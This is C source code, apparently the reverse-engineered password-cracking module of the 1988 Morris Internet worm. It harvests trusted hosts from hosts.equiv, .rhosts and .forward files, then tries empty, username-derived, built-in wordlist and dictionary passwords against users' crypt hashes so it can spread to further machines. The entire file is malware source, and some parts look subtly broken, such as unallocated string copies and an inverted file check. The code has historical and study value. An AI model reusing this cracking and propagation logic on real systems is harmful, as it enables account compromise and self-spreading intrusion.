/* Dover */

#include "worm.h"
#include <stdio.h>
#include <ctype.h>
#include <strings.h>
#include <pwd.h>

int cmode;
extern struct hst *h_name2host();

struct usr {					/* sizeof(usr) == 58 */
    char *name, *o4, *o8, *o12;
    char passwd[14];				/* offset 16 */
    char decoded_passwd[14];			/* 30 */
    short pad;
    char *homedir;				/* offset 46 */
    char *gecos;				/* offset 50 */
    struct usr *next;				/* offset 54 */
};

/* Ahhh, I just love these names.  Don't change them for anything. */
static struct usr *x27f28, *x27f2c;

/* Crack some passwords. */
cracksome()
{
    switch (cmode){
    case 0:
	strat_0();
	return;					/* 88 */
    case 1:
	strat_1();
	return;
    case 2:
	try_words();
	return;
    case 3:
	dict_words();
	return;
    }
}

/* Strategy 0, look through /etc/hosts.equiv, and /.rhost for new hosts */
strat_0()					/* 0x5da4 */
{
    FILE *hosteq;
    char scanbuf[512];
    char fwd_buf[256];
    char *fwd_host;
    char getbuf[256];
    struct passwd *pwent;
    char local[20];
    struct usr *user;
    struct hst *host;				/* 1048 */
    int check_other_cnt;			/* 1052 */
    static struct usr *user_list = NULL;

    hosteq = fopen(XS("/etc/hosts.equiv"), XS("r"));
    if (hosteq != NULL) {			/* 292 */
	while (fscanf(hosteq, XS("%.100s"), scanbuf)) {
	    host = h_name2host(scanbuf, 0);
	    if (host == 0) {
		host = h_name2host(scanbuf, 1);
		getaddrs(host);
	    }
	    if (host->o48[0] == 0)		/* 158 */
		continue;
	    host->flag |= 8;
	}
	fclose(hosteq);				/* 280 */
    }

    hosteq = fopen(XS("/.rhosts"), XS("r"));
    if (hosteq != NULL) {			/* 516 */
	while (fgets(getbuf, sizeof(getbuf), hosteq)) { /* 344,504 */
	    if (sscanf(getbuf, XS("%s"), scanbuf) != 1)
		continue;
	    host = h_name2host(scanbuf, 0);
	    while (host == 0) {			/* 436, 474 */
		host = h_name2host(scanbuf, 1);
		getaddrs(host);
	    }
	    if (host->o48[0] == 0)
		continue;
	    host->flag |= 8;
	}
	fclose(hosteq);
    }

    /* look through the passwd file, checking for contact with others every
     * tenth entry. */
    setpwent();
    check_other_cnt = 0;					/* 522 */
    while ((pwent = getpwent()) != 0) {		/* 526, 1124 */
	if ((check_other_cnt % 10) == 0)
	    other_sleep(0);
	check_other_cnt++;
	sprintf(fwd_buf, XS("%.200s/.forward"), pwent->pw_dir);
	hosteq = fopen(fwd_buf, XS("r"));
	if (hosteq != NULL) {			/* 834 */
	    while (fgets(scanbuf, sizeof(scanbuf), hosteq)) { /* 650,822 */
		/* Punt the newline */
		(&scanbuf[strlen(scanbuf)])[-1] = '\0';
		fwd_host = index(scanbuf, '@');
		if (fwd_host == NULL)
		    continue;
		host = h_name2host(++fwd_host, 0);
		if (host == NULL) {
		    host = h_name2host(fwd_host, 1);
		    getaddrs(host);
		}
		if (host->o48[0] == 0)
		    continue;
		host->flag |= 8;
	    }
	    fclose(hosteq);
	}
	/* Don't do foreign or compilcated hosts */
	if (strlen(host->hostname) > 11)
	    continue;
	user = (struct usr *)malloc(sizeof(struct usr));
	strcpy(user->name, pwent->pw_name);
	strcpy(&user->passwd[0], XS("x"));
	user->decoded_passwd[0] = '\0';
	user->homedir = strcpy(malloc(strlen(pwent->pw_dir)+1), pwent->pw_dir);
	user->gecos = strcpy(malloc(strlen(pwent->pw_gecos)+1), pwent->pw_gecos
);
	user->next = user_list;
	user_list = user;
    }
    endpwent();
    cmode = 1;
    x27f2c = user_list;
    return;
}

/* Check for 'username', 'usernameusername' and 'emanresu' as passwds. */
static strat_1()				/* 0x61ca */
{
    int cnt;
    char usrname[50], buf[50];

    for (cnt = 0; x27f2c && cnt < 50; x27f2c = x27f2c->next) { /* 1740 */
	/* Every tenth time look for "me mates" */
	if ((cnt % 10) == 0)
	    other_sleep(0);
	/* Check for no passwd */
	if (try_passwd(x27f2c, XS("")))			/* other_fd+84 */
	    continue;			/* 1722 */
	/* If the passwd is something like "*" punt matching it. */
	if (strlen(x27f2c->passwd) != 13)
	    continue;
	strncpy(usrname, x27f2c, sizeof(usrname)-1);
	usrname[sizeof(usrname)-1] = '\0';
	if (try_passwd(x27f2c, usrname))
	    continue;
	sprintf(buf, XS("%.20s%.20s"), usrname, usrname);
	if (try_passwd(x27f2c, buf))
	    continue;				/* 1722 */
	sscanf(x27f2c->gecos, XS("%[^ ,]"), buf);
	if (isupper(buf[0]))
	    buf[0] = tolower(buf[0]);
	if (strlen(buf) > 3  && try_passwd(x27f2c, buf))
	    continue;
	buf[0] = '\0';
	sscanf(x27f2c->gecos, XS("%*s %[^ ,]s"), buf);
	if (isupper(buf[0]))
	    buf[0] = tolower(buf[0]);
	if (strlen(buf) > 3  && index(buf, ',') == NULL  &&
	    try_passwd(x27f2c, buf))
	    continue;
	reverse_str(usrname, buf);
	if (try_passwd(x27f2c, buf))
	    ;
    }
    if (x27f2c == 0)
	cmode = 2;
    return;
}

static reverse_str(str1, str2)			/* x642a */
     char *str1, *str2;
{
    int length, i;

    length = strlen(str1);

    for(i = 0; i < length; i++)
	str2[i] = (&str1[length-i]) [-1];
    str2[length] = '\0';
    return;
}

static try_passwd(user, str)			/* 0x6484, unchecked */
     struct usr *user;
     char *str;
{
    if (strcmp(user->passwd, crypt(str, user->passwd)) == 0  ||
	(str[0] == '\0'  &&  user->passwd == '\0')) {
	    strncpy(user->decoded_passwd, str, sizeof(user->decoded_passwd));
	    user->decoded_passwd[sizeof(user->decoded_passwd)-1] = '\0';
	    attack_user(user);
	    return 1;
	}
    return 0;
}


/* Collect hostnames and run hueristic #1 for this user's .forward and .rhosts
 */
/* This is only called from try_passwd() */
static attack_user(user)			/* 0x6514 */
     struct usr *user;
{
    FILE *fwd_fp;
    char buf[512], *hostpart;			/* l516 */
    char rhbuf[256];				/* l776 */
    char l1288[512];
    struct hst *host;				/* l1292 */

    sprintf(buf, XS("%.200s/.forward"), user->homedir);	/* <other_fd+11
5> */
    fwd_fp = fopen(buf, XS("r"));
    if (fwd_fp) {
	while (fgets(buf, sizeof(buf), fwd_fp)) { /* 2088,2222 */
	    /* Punt the newline */
	    buf[strlen(buf) - 1] = '\0';
	    hostpart = index(buf, '@');
	    /* If no hostname, it's not foreign so ignore it. */
	    if (hostpart == NULL)
		continue;
	    /* Split username and hostname */
	    *hostpart++ = '\0';

	    /* Here there appears to be a bug!!!  It works correctly
	     * by coincidence of pushing things on the stack. */
#ifndef FIX_BUGS
	    host = h_name2host(hostpart, 1);
	    hu1(user, host, buf);
#else						/* original */
	    /* 'hu1' should have another argument */
	    hu1(user, (host = h_name2host(hostpart, 1, buf)));
#endif

	}
	fclose(fwd_fp);
    }

    sprintf(buf, XS("%.200s/.rhosts"), user->homedir);
    fwd_fp = fopen(buf, XS("r"));
    if (fwd_fp) {				/* 2446 */
	while (fgets(rhbuf, sizeof(rhbuf), fwd_fp)) { /* 2312,2434 */
	    l1288[0] = '\0';
	    if (sscanf(rhbuf, XS("%s%s"), buf, l1288) < 1)
		continue;
	    host = h_name2host(buf, 1);
	    hu1(user, host, l1288);
	}
	fclose(fwd_fp);
    }
    return;
}

/* This array in the sun binary was camaflouged by having the
   high-order bit set in every char. */

char *wds[] = 					/* 0x21a74 */
{
 	"academia", "aerobics", "airplane", "albany",
 	"albatross", "albert", "alex", "alexander",
 	"algebra", "aliases", "alphabet", "amorphous",
 	"analog", "anchor", "andromache", "animals",
 	"answer", "anthropogenic", "anvils", "anything",
 	"aria", "ariadne", "arrow", "arthur",
 	"athena", "atmosphere", "aztecs", "azure",
 	"bacchus", "bailey", "banana", "bananas",
 	"bandit", "banks", "barber", "baritone",
 	"bass", "bassoon", "batman", "beater",
 	"beauty", "beethoven", "beloved", "benz",
 	"beowulf", "berkeley", "berliner", "beryl",
 	"beverly", "bicameral", "brenda", "brian",
 	"bridget", "broadway", "bumbling", "burgess",
 	"campanile", "cantor", "cardinal", "carmen",
 	"carolina", "caroline", "cascades", "castle",
 	"cayuga", "celtics", "cerulean", "change",
 	"charles", "charming", "charon", "chester",
 	"cigar", "classic", "clusters", "coffee",
 	"coke", "collins", "commrades", "computer",
 	"condo", "cookie", "cooper", "cornelius",
 	"couscous", "creation", "creosote", "cretin",
 	"daemon", "dancer", "daniel", "danny",
 	"dave", "december", "defoe", "deluge",
 	"desperate", "develop", "dieter", "digital",
 	"discovery", "disney", "drought", "duncan",
 	"eager", "easier", "edges", "edinburgh",
 	"edwin", "edwina", "egghead", "eiderdown",
 	"eileen", "einstein", "elephant", "elizabeth",
 	"ellen", "emerald", "engine", "engineer",
 	"enterprise", "enzyme", "ersatz", "establish",
 	"estate", "euclid", "evelyn", "extension",
 	"fairway", "felicia", "fender", "fermat",
 	"fidelity", "finite", "fishers", "flakes",
 	"float", "flower", "flowers", "foolproof",
 	"football", "foresight", "format", "forsythe",
 	"fourier", "fred", "friend", "frighten",
 	"fungible", "gabriel", "gardner", "garfield",
 	"gauss", "george", "gertrude", "ginger",
 	"glacier", "golfer", "gorgeous", "gorges",
 	"gosling", "gouge", "graham", "gryphon",
 	"guest", "guitar", "gumption", "guntis",
 	"hacker", "hamlet", "handily", "happening",
 	"harmony", "harold", "harvey", "hebrides",
 	"heinlein", "hello", "help", "herbert",
 	"hiawatha", "hibernia", "honey", "horse",
 	"horus", "hutchins", "imbroglio", "imperial",
 	"include", "ingres", "inna", "innocuous",
 	"irishman", "isis", "japan", "jessica",
 	"jester", "jixian", "johnny", "joseph",
 	"joshua", "judith", "juggle", "julia",
 	"kathleen", "kermit", "kernel", "kirkland",
 	"knight", "ladle", "lambda", "lamination",
 	"larkin", "larry", "lazarus", "lebesgue",
 	"leland", "leroy", "lewis", "light",
 	"lisa", "louis", "lynne", "macintosh",
 	"mack", "maggot", "magic", "malcolm",
 	"mark", "markus", "marty", "marvin",
 	"master", "maurice", "mellon", "merlin",
 	"mets", "michael", "michelle", "mike",
 	"minimum", "minsky", "moguls", "moose",
 	"morley", "mozart", "nancy", "napoleon",
 	"nepenthe", "ness", "network", "newton",
 	"next", "noxious", "nutrition", "nyquist",
 	"oceanography", "ocelot", "olivetti", "olivia",
 	"oracle", "orca", "orwell", "osiris",
 	"outlaw", "oxford", "pacific", "painless",
 	"pakistan", "papers", "password", "patricia",
 	"penguin", "peoria", "percolate", "persimmon",
 	"persona", "pete", "peter", "philip",
 	"phoenix", "pierre", "pizza", "plover",
 	"plymouth", "polynomial", "pondering", "pork",
 	"poster", "praise", "precious", "prelude",
 	"prince", "princeton", "protect", "protozoa",
 	"pumpkin", "puneet", "puppet", "rabbit",
 	"rachmaninoff", "rainbow", "raindrop", "raleigh",
 	"random", "rascal", "really", "rebecca",
 	"remote", "rick", "ripple", "robotics",
 	"rochester", "rolex", "romano", "ronald",
 	"rosebud", "rosemary", "roses", "ruben",
 	"rules", "ruth", "saxon", "scamper",
 	"scheme", "scott", "scotty", "secret",
 	"sensor", "serenity", "sharks", "sharon",
 	"sheffield", "sheldon", "shiva", "shivers",
 	"shuttle", "signature", "simon", "simple",
 	"singer", "single", "smile", "smiles",
 	"smooch", "smother", "snatch", "snoopy",
 	"soap", "socrates", "sossina", "sparrows",
 	"spit", "spring", "springer", "squires",
 	"strangle", "stratford", "stuttgart", "subway",
 	"success", "summer", "super", "superstage",
 	"support", "supported", "surfer", "suzanne",
 	"swearer", "symmetry", "tangerine", "tape",
 	"target", "tarragon", "taylor", "telephone",
 	"temptation", "thailand", "tiger", "toggle",
 	"tomato", "topography", "tortoise", "toyota",
 	"trails", "trivial", "trombone", "tubas",
 	"tuttle", "umesh", "unhappy", "unicorn",
 	"unknown", "urchin", "utility", "vasant",
 	"vertigo", "vicky", "village", "virginia",
 	"warren", "water", "weenie", "whatnot",
 	"whiting", "whitney", "will", "william",
 	"williamsburg", "willie", "winston", "wisconsin",
 	"wizard", "wombat", "woodwind", "wormwood",
 	"yacov", "yang", "yellowstone", "yosemite",
 	"zimmerman",
	0
};
int nextw = 0;					/* 0x24868 */

/* Try a list of potential passwds for each user. */
static try_words()				/* 0x66da */
{
    struct usr *user;
    int i, j;

    if (wds[nextw] == 0) {
	cmode++;
	return;					/* 2724 */
    }
    if (nextw == 0) {				/* 2550 */
	for (i = 0; wds[i]; i++)
	    ;
	permute(wds, i, sizeof(wds[0]));
    }

    for (j = 0; wds[nextw][j] != '\0'; j++)
	wds[nextw][j] &= 0x7f;
    for (user = x27f28; user; user = user->next)
	try_passwd(user, wds[nextw]);
    for (j = 0; wds[nextw][j]; j++)		/* 2664,2718 */
	wds[nextw][j] |= 0x80;
    nextw += 1;
    return;
}


/* Called only from the cracksome() dispatch loop. Tries a single word from th
e
 * dictionary, downcasing if capitalized and trying again. */
static dict_words()				/* 0x67f0 */
{
    char buf[512];
    struct usr *user;
    static FILE *x27f30;

    if (x27f30 != NULL) {
	x27f30 = fopen(XS("/usr/dict/words"), XS("r"));
	if (x27f30 == NULL)
	    return;
    }
    if (fgets(buf, sizeof(buf), x27f30) == 0) {	/* 2808,2846 */
	cmode++;
	return;
    }
    (&buf[strlen(buf)])[-1] = '\0';

    for (user = x27f28; user; user = user->next) /* 2910 */
	try_passwd(user, buf);
    if (!isupper(buf[0]))
	return;
    buf[0] = tolower(buf[0]);

    for (user = x27f28; user; user = user->next)
	try_passwd(user, buf);
    return;					/* 2988 */
}
	
/*
 * Local variables:
 * comment-column: 48
 * compile-command: "cc -S cracksome.c"
 * End:
 */

